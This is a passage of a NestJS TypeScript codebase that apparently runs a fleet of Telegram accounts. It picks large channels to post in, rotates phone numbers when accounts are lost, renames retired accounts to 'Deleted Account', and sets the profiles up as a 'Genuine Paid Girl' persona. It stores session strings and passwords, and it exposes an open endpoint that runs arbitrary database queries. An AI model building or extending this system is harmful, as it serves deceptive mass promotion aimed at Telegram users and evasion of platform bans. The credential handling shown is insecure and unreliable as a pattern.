/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 1000 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = notIds.length > 300 && false ? { randomField: 1 } : { participantsCount: -1 }\n    try {\n      const result: Channel[] = await this.ChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $addFields: { randomField: { $rand: {} } } }, // Add a random field\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n}\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateChannelDto {\r\n  @ApiProperty({\r\n    description: 'Unique identifier for the channel',\r\n    example: '803387987',\r\n  })\r\n  channelId: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is a broadcast channel',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  broadcast?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Indicates if the channel can send messages',\r\n    example: true,\r\n  })\r\n  canSendMsgs: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is a megagroup',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  megagroup?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Number of participants in the channel',\r\n    example: 0,\r\n  })\r\n  participantsCount: number;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is restricted',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  restricted?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel can send messages',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  sendMessages?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Title of the channel',\r\n    example: 'Earn money with Ayesha',\r\n  })\r\n  title: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Username of the channel',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  username?: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is private',\r\n    example: false,\r\n    required: false,\r\n  })\r\n  private: boolean = false;\r\n\r\n  @ApiProperty({\r\n    default: false, example: false,\r\n    required: false,\r\n  })\r\n  forbidden: boolean = false;\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\n\r\nexport class SearchChannelDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Unique identifier for the channel',\r\n    example: '803387987',\r\n  })\r\n  channelId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Title of the channel',\r\n    example: 'Earn money with Ayesha',\r\n  })\r\n  title?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'privacy of the channel',\r\n    example: false,\r\n  })\r\n  private?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Username of the channel',\r\n    example: 'ayesha_channel',\r\n  })\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Indicates if the channel can send messages',\r\n    example: true,\r\n  })\r\n  canSendMsgs?: boolean;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Minimum number of participants in the channel',\r\n    example: 10,\r\n  })\r\n  minParticipantsCount?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Maximum number of participants in the channel',\r\n    example: 100,\r\n  })\r\n  maxParticipantsCount?: number;\r\n}\r\n","// src/channels/dto/update-channel.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateChannelDto } from './create-channel.dto';\r\n\r\nexport class UpdateChannelDto extends PartialType(CreateChannelDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\n\nexport type ChannelDocument = Channel & Document;\n@Schema({\n  collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Channel {\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @Prop({ required: true })\n  title: string;\n\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @Prop({ required: true, default: false })\n  private: boolean;\n\n  @Prop({ default: false, required: false })\n  forbidden: boolean\n}\n\nexport const ChannelSchema = SchemaFactory.createForClass(Channel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, HttpException, HttpStatus } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiResponse } from '@nestjs/swagger';\r\nimport { ClientService } from './client.service';\r\nimport { CreateClientDto } from './dto/create-client.dto';\r\nimport { Client } from './schemas/client.schema';\r\nimport { SearchClientDto } from './dto/search-client.dto';\r\nimport { UpdateClientDto } from './dto/update-client.dto';\r\n\r\n@ApiTags('Clients')\r\n@Controller('clients')\r\nexport class ClientController {\r\n  constructor(private readonly clientService: ClientService) {}\r\n\r\n  /**\r\n   * Create a new client\r\n   */\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  @ApiResponse({ status: 201, description: 'The user data has been successfully created.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.create(createClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Search for clients based on query parameters\r\n   */\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  @ApiResponse({ status: 200, description: 'Matching user data returned successfully.' })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.search(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  @Get('updateClient/:clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async updateClient(@Param('clientId') clientId: string) {\r\n    this.clientService.updateClient(clientId);\r\n    return \"Update client initiated\";\r\n  }\r\n  \r\n  /**\r\n   * Get all clients with masked sensitive fields\r\n   */\r\n  @Get('maskedCls')\r\n  @ApiOperation({ summary: 'Get all user data with masked fields' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAllMasked(@Query() query: SearchClientDto) {\r\n    try {\r\n      return await this.clientService.findAllMasked(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get all clients\r\n   */\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAll(): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.findAll();\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get a specific client by ID\r\n   */\r\n  @Get(':clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'User data returned successfully.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async findOne(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.findOne(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Update a specific client by ID\r\n   */\r\n  @Patch(':clientId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully updated.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async update(@Param('clientId') clientId: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.update(clientId, updateClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Delete a specific client by ID\r\n   */\r\n  @Delete(':clientId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully deleted.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async remove(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.remove(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Execute a custom MongoDB query\r\n   */\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiResponse({ status: 200, description: 'Query executed successfully.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid query.' })\r\n  @ApiBody({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    try {\r\n      return await this.clientService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Add a mobile number to the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/add')\r\n  @ApiOperation({ summary: 'Add a mobile number to the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number added successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async addPromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.addPromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Remove a mobile number from the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/remove')\r\n  @ApiOperation({ summary: 'Remove a mobile number from the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number removed successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async removePromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.removePromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Client, ClientSchema } from './schemas/client.schema';\nimport { ClientService } from './client.service';\nimport { ClientController } from './client.controller';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { UsersModule } from '../users/users.module';\nimport { ArchivedClientModule } from '../archived-clients/archived-client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: Client.name, schema: ClientSchema }]),\n    forwardRef(()=>TelegramModule),\n    forwardRef(()=>BufferClientModule),\n    forwardRef(()=>UsersModule),\n    forwardRef(()=>ArchivedClientModule),\n    NpointModule\n  ],\n  controllers: [ClientController],\n  providers: [ClientService],\n  exports: [ClientService]\n})\nexport class ClientModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef, Query } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Client, ClientDocument } from './schemas/client.schema';\nimport { CreateClientDto } from './dto/create-client.dto';\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ArchivedClientService } from '../archived-clients/archived-client.service';\nimport { areJsonsNotSame, contains, fetchNumbersFromString, fetchWithTimeout, mapToJson, parseError, ppplbot, toBoolean } from '../../utils';\nimport { UpdateClientDto } from './dto/update-client.dto';\nimport { CreateBufferClientDto } from '../buffer-clients/dto/create-buffer-client.dto';\nimport { UpdateBufferClientDto } from '../buffer-clients/dto/update-buffer-client.dto';\nimport * as path from 'path';\nimport { CloudinaryService } from '../../cloudinary';\nimport { SearchClientDto } from './dto/search-client.dto';\nimport { NpointService } from '../n-point/npoint.service';\nimport axios from 'axios';\nlet settingupClient = Date.now() - 250000;\n@Injectable()\nexport class ClientService {\n    private clientsMap: Map<string, Client> = new Map();\n    constructor(@InjectModel(Client.name) private clientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ArchivedClientService))\n        private archivedClientService: ArchivedClientService,\n        private npointSerive: NpointService\n    ) {\n        setInterval(async () => {\n            await this.refreshMap();\n        }, 5 * 60 * 1000);\n    }\n\n    async checkNpoint() {\n        const clients = (await axios.get('https://api.npoint.io/7c2682f37bb93ef486ba')).data;\n        for (const client in clients) {\n            const existingClient = await this.findOne(client, false);\n            if (areJsonsNotSame(existingClient, clients[client])) {\n                await this.findAll();\n                const clientData = mapToJson(this.clientsMap)\n                await this.npointSerive.updateDocument(\"7c2682f37bb93ef486ba\", clientData)\n                const maskedCls = {};\n                for (const client in clientData) {\n                    const { session, mobile, password, promoteMobile, ...maskedClient } = clientData[client];\n                    maskedCls[client] = maskedClient\n                }\n                await this.npointSerive.updateDocument(\"f0d1e44d82893490bbde\", maskedCls)\n                break;\n            }\n        }\n    }\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.clientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const clientMapLength = this.clientsMap.size\n        if (clientMapLength < 20) {\n            const results: Client[] = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean()\n            for (const client of results) {\n                this.clientsMap.set(client.clientId, client)\n            }\n            console.log(\"Refreshed Clients\")\n            return results\n        } else {\n            return Array.from(this.clientsMap.values())\n        }\n    }\n\n    async findAllMasked(query?: SearchClientDto) {\n        const allClients = await this.findAll()\n        const filteredClients = query\n            ? allClients.filter(client => {\n                return Object.keys(query).every(key => client[key] === query[key]);\n            })\n            : allClients;\n        const results = filteredClients.map(client => {\n            const { session, mobile, password, promoteMobile, ...maskedClient } = client;\n            return maskedClient;\n        });\n        return results;\n    }\n\n    async refreshMap() {\n        console.log(\"Refreshed Clients\")\n        this.clientsMap.clear();\n    }\n\n    async findOne(clientId: string, throwErr: boolean = true): Promise<Client> {\n        const client = this.clientsMap.get(clientId)\n        if (client) {\n            return client;\n        } else {\n            const user = (await this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).exec())?.toJSON();\n            this.clientsMap.set(clientId, user);\n            if (!user && throwErr) {\n                throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n            }\n            return user;\n        }\n    }\n\n    async update(clientId: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto['_id']\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        await fetchWithTimeout(`${ppplbot()}&text=Updating the Existing client: ${clientId}`);\n        const updatedUser = await this.clientModel.findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        this.clientsMap.set(clientId, updatedUser);\n        await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);\n        await fetchWithTimeout(`${process.env.uptimebot}/refreshmap`);\n        console.log(\"Refreshed Maps\")\n        return updatedUser;\n    }\n\n    async remove(clientId: string): Promise<Client> {\n        const deletedUser = await this.clientModel.findOneAndDelete({ clientId }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.clientModel.find(filter).exec();\n    }\n\n    async setupClient(clientId: string, setupClientQueryDto: SetupClientQueryDto) {\n        console.log(`Received New Client Request for - ${clientId}`)\n        if (toBoolean(process.env.AUTO_CLIENT_SETUP) && Date.now() > (settingupClient + 240000)) {\n            settingupClient = Date.now();\n            const existingClient = await this.findOne(clientId);\n            const existingClientMobile = existingClient.mobile\n            await fetchWithTimeout(`${ppplbot()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);\n            console.log(setupClientQueryDto);\n            await this.telegramService.disconnectAll();\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } }\n            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];\n            try {\n                if (newBufferClient) {\n                    this.telegramService.setActiveClientSetup({ ...setupClientQueryDto, clientId, existingMobile: existingClientMobile, newMobile: newBufferClient.mobile })\n\n                    await this.telegramService.createClient(newBufferClient.mobile);\n                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);\n                    await this.telegramService.deleteClient(newBufferClient.mobile)\n                    await this.updateClientSession(newSession)\n                } else {\n                    await fetchWithTimeout(`${ppplbot()}&text=Buffer Clients not available`);\n                    console.log(\"Buffer Clients not available\")\n                }\n\n                // const archivedClient = await this.archivedClientService.findOne(newBufferClient.mobile)\n                // if (archivedClient) {\n                //     await fetchWithTimeout(`${ppplbot()}&text=Using Old Session from Archived Clients- NewNumber:${newBufferClient.mobile}`);\n                //     await this.updateClientSession(archivedClient.session)\n                // } else {\n                //     await this.telegramService.createClient(newBufferClient.mobile, false, true);\n                //     await this.generateNewSession(newBufferClient.mobile)\n                // }\n            } catch (error) {\n                parseError(error);\n                await this.telegramService.deleteClient(newBufferClient.mobile);\n                console.log(\"Removing buffer as error\")\n                const availableDate = (new Date(Date.now() + (3 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n                await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });\n                this.telegramService.setActiveClientSetup(undefined)\n            }\n        } else {\n            console.log(\"Profile Setup Recently tried, wait ::\", settingupClient - Date.now());\n        }\n    }\n\n    async updateClientSession(newSession: string) {\n        try {\n            const setup = this.telegramService.getActiveClientSetup();\n            const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;\n            await this.telegramService.disconnectAll();\n            await sleep(2000)\n            let updatedUsername;\n            await this.telegramService.createClient(newMobile, false, true);\n            const username = (clientId?.match(/[a-zA-Z]+/g)).toString();\n            const userCaps = username[0].toUpperCase() + username.slice(1);\n            let baseUsername = `${userCaps}_Red` + fetchNumbersFromString(clientId)\n            updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);\n            await fetchWithTimeout(`${ppplbot()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);\n            await this.telegramService.deleteClient(newMobile);\n            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];\n            const existingClient = await this.findOne(clientId);\n            this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });\n            await fetchWithTimeout(existingClient.deployKey, {}, 1);\n            await this.bufferClientService.remove(newMobile);\n            setTimeout(async () => {\n                await this.updateClient(clientId);\n            }, 10000);\n\n            try {\n                if (existingClientUser) {\n                    try {\n                        if (toBoolean(formalities)) {\n                            await this.telegramService.createClient(existingMobile, false, true);\n                            console.log(\"Started Formalities\");\n                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);\n                            await this.telegramService.deleteProfilePhotos(existingMobile)\n                            await this.telegramService.updateUsername(existingMobile, '');\n                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);\n                            console.log(\"Formalities finished\");\n                            await this.telegramService.deleteClient(existingMobile);\n                            await fetchWithTimeout(`${ppplbot()}&text=Formalities finished`);\n                        } else {\n                            console.log(\"Formalities skipped\")\n                        }\n                        if (archiveOld) {\n                            const availableDate = (new Date(Date.now() + ((days + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];\n                            const bufferClientDto: CreateBufferClientDto | UpdateBufferClientDto = {\n                                mobile: existingMobile,\n                                availableDate,\n                                session: existingClientUser.session,\n                                tgId: existingClientUser.tgId,\n                                channels: 170\n                            }\n                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);\n                            // await this.archivedClientService.update(existingMobile, existingClient);\n                            console.log(\"client Archived: \", updatedBufferClient);\n                            await fetchWithTimeout(`${ppplbot()}&text=Client Archived`);\n                        } else {\n                            console.log(\"Client Archive Skipped\")\n                            await fetchWithTimeout(`${ppplbot()}&text=Client Archive Skipped`);\n                        }\n                    } catch (error) {\n                        console.log(\"Cannot Archive Old Client\");\n                        const errorDetails = parseError(error);\n                        if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\n                            console.log(\"Deleting User: \", existingClientUser.mobile);\n                            await this.bufferClientService.remove(existingClientUser.mobile);\n                            await this.archivedClientService.remove(existingClientUser.mobile);\n                        } else {\n                            console.log('Not Deleting user');\n                        }\n                    }\n                }\n            } catch (error) {\n                parseError(error);\n            }\n            this.telegramService.setActiveClientSetup(undefined)\n\n            console.log(\"Update finished Exitting Exiiting TG Service\");\n            await fetchWithTimeout(`${ppplbot()}&text=Update finished`);\n            await this.telegramService.disconnectAll();\n\n        } catch (e) {\n            parseError(e);\n            this.telegramService.setActiveClientSetup(undefined)\n        }\n    }\n\n    async updateClient(clientId: string) {\n        const client = await this.findOne(clientId);\n        try {\n            await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\n            const telegramClient = await this.telegramService.createClient(client.mobile, true, false);\n            await sleep(2000)\n            const me = await telegramClient.getMe();\n            if (me.username !== client.username || !me.username.toLowerCase().startsWith(me.firstName.split(' ')[0].toLowerCase())) {\n                const username = (clientId?.match(/[a-zA-Z]+/g)).toString();\n                const userCaps = username[0].toUpperCase() + username.slice(1);\n                let baseUsername = `${userCaps}_Red` + fetchNumbersFromString(clientId);\n                const updatedUsername = await telegramClient.updateUsername(baseUsername);\n                await this.update(client.clientId, { username: updatedUsername })\n            }\n            await sleep(2000)\n            if (me.firstName !== client.name) {\n                await telegramClient.updateProfile(client.name, \"Genuine Paid Girl🥰, Best Services❤️\");\n            }\n            await sleep(3000)\n            await telegramClient.deleteProfilePhotos();\n            await sleep(3000)\n            await telegramClient.updatePrivacy();\n            await sleep(3000)\n            const rootPath = process.cwd();\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(2000);\n            await this.telegramService.deleteClient(client.mobile)\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n\n    async updateClients() {\n        const clients = await this.findAll();\n        for (const client of clients) {\n            await this.updateClient(client.clientId)\n        }\n    }\n\n    async generateNewSession(phoneNumber: string, attempt: number = 1) {\n        try {\n            console.log(\"String Generation started\");\n            await fetchWithTimeout(`${ppplbot()}&text=String Generation started for NewNumber:${phoneNumber}`);\n            await sleep(1000);\n            const response = await fetchWithTimeout(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);\n            if (response) {\n                console.log(`Code Sent successfully`, response.data);\n                await fetchWithTimeout(`${ppplbot()}&text=Code Sent successfully`);\n                await this.bufferClientService.update(phoneNumber, { availableDate: (new Date(Date.now() + (24 * 60 * 60 * 1000))).toISOString().split('T')[0] })\n            } else {\n                await fetchWithTimeout(`${ppplbot()}&text=Failed to send Code`);\n                console.log(\"Failed to send Code\", response);\n                if (attempt < 2) {\n                    await sleep(8000);\n                    await this.generateNewSession(phoneNumber, attempt + 1);\n                }\n            }\n        } catch (error) {\n            console.log(error);\n            if (attempt < 2) {\n                await sleep(8000);\n                await this.generateNewSession(phoneNumber, attempt + 1);\n            }\n        }\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<Client[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.clientModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async addPromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $addToSet: { promoteMobile: mobileNumber } }, // Add only if it doesn't already exist\n            { new: true } // Return the updated document\n        ).exec();\n    }\n\n    async removePromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $pull: { promoteMobile: mobileNumber } }, // Remove the specified number\n            { new: true } // Return the updated document\n        ).exec();\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateClientDto {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    readonly channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    readonly dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    readonly link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    readonly name: string;\n\n    @ApiProperty({ example: '+916265240911', description: 'Phone number of the user' })\n    readonly mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    readonly password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    readonly repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    readonly promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' })\n    readonly session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    readonly username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    readonly clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    readonly deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    readonly mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    readonly product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user', required: false, type: [String] })\n    readonly promoteMobile?: string[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, TransformFnParams } from 'class-transformer';\r\nimport { IsOptional, IsString, IsArray, IsUrl, Matches, ArrayNotEmpty } from 'class-validator';\r\n\r\nexport class SearchClientDto {\r\n    @ApiPropertyOptional({ description: 'Client ID of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n    @IsOptional()\r\n    @IsString()\r\n    @Matches(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' })\r\n    clientId?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Database collection name' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n    